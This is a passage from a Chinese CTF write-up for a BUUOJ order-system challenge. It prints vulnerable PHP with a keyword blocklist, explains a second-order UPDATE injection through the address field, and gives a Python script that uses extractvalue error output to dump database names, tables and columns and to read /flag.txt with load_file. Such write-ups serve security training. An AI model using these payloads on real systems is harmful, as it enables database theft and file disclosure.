<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    <span class="variable">$user_name</span> = <span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    <span class="variable">$phone</span> = <span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$user_name</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$phone</span>))&#123; </span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$fetch</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$fetch</span>) &amp;&amp; <span class="variable">$fetch</span>-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$fetch</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$row</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">print_r</span>(<span class="variable">$db</span>-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;&lt;p&gt;姓名:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;user_name&#x27;</span>].<span class="string">&quot;&lt;/p&gt;&lt;p&gt;, 电话:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;phone&#x27;</span>].<span class="string">&quot;&lt;/p&gt;&lt;p&gt;, 地址:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;address&#x27;</span>].<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;未找到订单!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;信息不全&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    <span class="variable">$user_name</span> = <span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    <span class="variable">$phone</span> = <span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$user_name</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$phone</span>))&#123; </span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$fetch</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$fetch</span>) &amp;&amp; <span class="variable">$fetch</span>-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$fetch</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;delete from `user` where `user_id`=&#x27;</span> . <span class="variable">$row</span>[<span class="string">&quot;user_id&quot;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">print_r</span>(<span class="variable">$db</span>-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;订单删除成功&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;未找到订单!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;信息不全&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;address&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    <span class="variable">$user_name</span> = <span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    <span class="variable">$address</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&quot;address&quot;</span>]);</span><br><span class="line">    <span class="variable">$phone</span> = <span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$user_name</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$phone</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$fetch</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$fetch</span>) &amp;&amp; <span class="variable">$fetch</span>-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$fetch</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;update `user` set `address`=&#x27;&quot;</span>.<span class="variable">$address</span>.<span class="string">&quot;&#x27;, `old_address`=&#x27;&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;address&#x27;</span>].<span class="string">&quot;&#x27; where `user_id`=&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;user_id&#x27;</span>];</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">print_r</span>(<span class="variable">$db</span>-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;订单修改成功&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;未找到订单!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;信息不全&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>简单的审计之后发现这4个文件对应四个功能，提交，删除，更改，查询<br>可以看到confirm.php中有include危险函数，但是并没什么卵用，因为设置了open_basedir选项，只允许我们在当前页面动手脚，然后这也是很重要的一个点<br>根据经验之谈，我们可以猜测flag为<code>/flag</code>或者是<code>/flag.txt</code>，要不然就没解了</p>
<p>然后可以看到查询，删除，提交界面里都有sql查询语句，但是都对phone和username参数进行了强烈的过滤：<br><code>$pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;</code><br>但是我们提交订单是有3个参数的，还有个address，审计后发现address在change.php有被利用：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667117016396-81229cf2-d024-416d-aa8d-be931e1d0454.png#averageHue=%23323d47&clientId=u4aebc35d-58a1-4&from=paste&height=33&id=ub46104e7&name=image.png&originHeight=41&originWidth=966&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9793&status=done&style=none&taskId=u9ec78422-9503-437f-a125-e48a072fa70&title=&width=772.8" alt="image.png"><br>这里是不是存在一个update注入呢？我们只需在提交订单的时候让address为<code>&#39;,user_name=extractvalue(1,concat(0x7e,database()))#</code>，然后再修改地址就能触发？，仔细想想是不是呢？说干就干：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667117168892-c6d5af6a-bcfc-4ead-af76-292426ca4a1b.png#averageHue=%23edd1a1&clientId=u4aebc35d-58a1-4&from=paste&height=105&id=ud05f1fec&name=image.png&originHeight=131&originWidth=1006&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11377&status=done&style=none&taskId=uc4b20511-2b55-474a-bb4f-22312e7514e&title=&width=804.8" alt="image.png"><br>芜湖~然后就以这个思路就可以进行我们的报错注入了，接下来我写个脚本，锻炼一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#Author:@Boogipop</span></span><br><span class="line">url=<span class="string">&quot;http://f654c362-3a5d-4d5b-b145-4013c08a3314.node4.buuoj.cn:81/&quot;</span></span><br><span class="line">name=<span class="string">&quot;1&quot;</span></span><br><span class="line">phone=<span class="string">&quot;1&quot;</span></span><br><span class="line">joke=<span class="string">&quot;1&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">put_order</span>(<span class="params">name,phone,address</span>):</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">&quot;user_name&quot;</span>:name,</span><br><span class="line">        <span class="string">&quot;phone&quot;</span>:phone,</span><br><span class="line">        <span class="string">&quot;address&quot;</span>:address</span><br><span class="line">    &#125;</span><br><span class="line">    r=requests.post(url=url+<span class="string">&quot;confirm.php&quot;</span>,data=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;订单提交成功&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        delete_order(name,phone)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_order</span>(<span class="params">name,phone</span>):</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">&quot;user_name&quot;</span>: name,</span><br><span class="line">        <span class="string">&quot;phone&quot;</span>: phone,</span><br><span class="line">    &#125;</span><br><span class="line">    r=requests.post(url=url+<span class="string">&quot;delete.php&quot;</span>,data=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;订单删除成功&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;qwq&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_order</span>(<span class="params">name,phone,address</span>):</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">&quot;user_name&quot;</span>: name,</span><br><span class="line">        <span class="string">&quot;phone&quot;</span>: phone,</span><br><span class="line">        <span class="string">&quot;address&quot;</span>:joke</span><br><span class="line">    &#125;</span><br><span class="line">    r=requests.post(url=url+<span class="string">&quot;change.php&quot;</span>,data=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;errorXPATH&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        res=r.text</span><br><span class="line">        res=res.split(<span class="string">&#x27;~&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;None&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_database_name</span>():</span><br><span class="line">    start=<span class="number">1</span></span><br><span class="line">    step=<span class="number">30</span></span><br><span class="line">    result=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        address=<span class="string">&quot;&#x27;,user_name=extractvalue(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),&#123;&#125;,&#123;&#125;),0x7e))#&quot;</span>.<span class="built_in">format</span>(start,step)</span><br><span class="line">        <span class="keyword">if</span> put_order(name,phone,address):</span><br><span class="line">            res = change_order(name, phone, joke)</span><br><span class="line">            res = <span class="string">&quot;&quot;</span> <span class="keyword">if</span> res == <span class="string">&quot;None&quot;</span> <span class="keyword">else</span> res</span><br><span class="line">            result += res</span><br><span class="line">            start += step</span><br><span class="line">            delete_order(name,phone)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(res)!=<span class="number">30</span>:</span><br><span class="line">                <span class="keyword">return</span> result.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_table_name</span>(<span class="params">database</span>):</span><br><span class="line">    start = <span class="number">1</span></span><br><span class="line">    step = <span class="number">30</span></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        address = <span class="string">&quot;&#x27;,user_name=extractvalue(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;&#123;&#125;&#x27;),&#123;&#125;,&#123;&#125;),0x7e))#&quot;</span>.<span class="built_in">format</span>(database,</span><br><span class="line">            start, step)</span><br><span class="line">        <span class="keyword">if</span> put_order(name, phone, address):</span><br><span class="line">            res = change_order(name, phone, joke)</span><br><span class="line">            res = <span class="string">&quot;&quot;</span> <span class="keyword">if</span> res == <span class="string">&quot;None&quot;</span> <span class="keyword">else</span> res</span><br><span class="line">            result += res</span><br><span class="line">            start += step</span><br><span class="line">            delete_order(name, phone)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(res) != <span class="number">30</span>:</span><br><span class="line">                <span class="keyword">return</span> result.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_column_name</span>(<span class="params">table</span>):</span><br><span class="line">    start = <span class="number">1</span></span><br><span class="line">    step = <span class="number">30</span></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        address = <span class="string">&quot;&#x27;,user_name=extractvalue(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;&#123;&#125;&#x27;),&#123;&#125;,&#123;&#125;),0x7e))#&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            table,</span><br><span class="line">            start, step)</span><br><span class="line">        <span class="keyword">if</span> put_order(name, phone, address):</span><br><span class="line">            res = change_order(name, phone, joke)</span><br><span class="line">            res = <span class="string">&quot;&quot;</span> <span class="keyword">if</span> res == <span class="string">&quot;None&quot;</span> <span class="keyword">else</span> res</span><br><span class="line">            result += res</span><br><span class="line">            start += step</span><br><span class="line">            delete_order(name, phone)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(res) != <span class="number">30</span>:</span><br><span class="line">                <span class="keyword">return</span> result.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_result</span>(<span class="params">database,table,column</span>):</span><br><span class="line">    start = <span class="number">1</span></span><br><span class="line">    step = <span class="number">30</span></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        address = <span class="string">&quot;&#x27;,user_name=extractvalue(1,concat(0x7e,substr((select group_concat(&#123;&#125;) from &#123;&#125;),&#123;&#125;,&#123;&#125;),0x7e))#&quot;</span>.<span class="built_in">format</span>(column,</span><br><span class="line">            database + <span class="string">&#x27;.&#x27;</span> +</span><br><span class="line">            table,</span><br><span class="line">            start, step)</span><br><span class="line">        <span class="keyword">if</span> put_order(name, phone, address):</span><br><span class="line">            res=change_order(name, phone, joke)</span><br><span class="line">            res=<span class="string">&quot;&quot;</span> <span class="keyword">if</span> res==<span class="string">&quot;None&quot;</span> <span class="keyword">else</span> res</span><br><span class="line">            result += res</span><br><span class="line">            start += step</span><br><span class="line">            delete_order(name, phone)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(res) != <span class="number">30</span>:</span><br><span class="line">                <span class="keyword">return</span> result.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_file</span>(<span class="params">filename</span>):</span><br><span class="line">    start = <span class="number">1</span></span><br><span class="line">    step = <span class="number">30</span></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        address = <span class="string">&quot;&#x27;,user_name=extractvalue(1,concat(0x7e,substr((select load_file(&#x27;&#123;&#125;&#x27;)),&#123;&#125;,&#123;&#125;),0x7e))#&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            filename,</span><br><span class="line">            start, step)</span><br><span class="line">        <span class="keyword">if</span> put_order(name, phone, address):</span><br><span class="line">            res = change_order(name, phone, joke)</span><br><span class="line">            res = <span class="string">&quot;&quot;</span> <span class="keyword">if</span> res == <span class="string">&quot;None&quot;</span> <span class="keyword">else</span> res</span><br><span class="line">            result += res</span><br><span class="line">            start += step</span><br><span class="line">            delete_order(name, phone)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(res) != <span class="number">30</span>:</span><br><span class="line">                <span class="keyword">return</span> result.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(get_database_name())<span class="comment">#获得数据库的名字</span></span><br><span class="line"><span class="comment">#[&#x27;information_schema&#x27;, &#x27;ctftraining&#x27;, &#x27;mysql&#x27;, &#x27;performance_schema&#x27;, &#x27;test&#x27;]</span></span><br><span class="line">    <span class="built_in">print</span>(get_table_name(<span class="string">&#x27;ctftraining&#x27;</span>))<span class="comment">#获得表名</span></span><br><span class="line">    table=get_table_name(<span class="string">&#x27;ctftraining&#x27;</span>)</span><br><span class="line">    <span class="comment">#[&#x27;FLAG_TABLE&#x27;, &#x27;news&#x27;, &#x27;users&#x27;]</span></span><br><span class="line">    <span class="comment"># database=&#x27;ctftraining&#x27;</span></span><br><span class="line">    <span class="comment"># for i in table:  #获得所得到的表中字段的所有数据</span></span><br><span class="line">    <span class="comment">#     column=get_column_name(i)</span></span><br><span class="line">    <span class="comment">#     print(&quot;ctftraining.&#123;&#125;:&#123;&#125;&quot;.format(i,column))</span></span><br><span class="line">    <span class="comment">#     for j in column:</span></span><br><span class="line">    <span class="comment">#         result=get_result(database,i,j)</span></span><br><span class="line">    <span class="comment">#         print(database+&quot;.&quot;+i+&quot;.&quot;+j+&quot;:&#123;&#125;&quot;.format(result))</span></span><br><span class="line">    <span class="built_in">print</span>(read_file(<span class="string">&#x27;/flag.txt&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667121671694-263250a7-e786-4f5a-81a8-3f5aa6c58176.png#averageHue=%232e2d2c&clientId=u4aebc35d-58a1-4&from=paste&height=74&id=u88d80aba&name=image.png&originHeight=93&originWidth=1186&originalType=binary&ratio=1&rotation=0&showTitle=false&size=17308&status=done&style=none&taskId=u7a7fb614-041e-488e-8a41-4a5c61647c9&title=&width=948.8" alt="image.png"><br>优雅~</p>
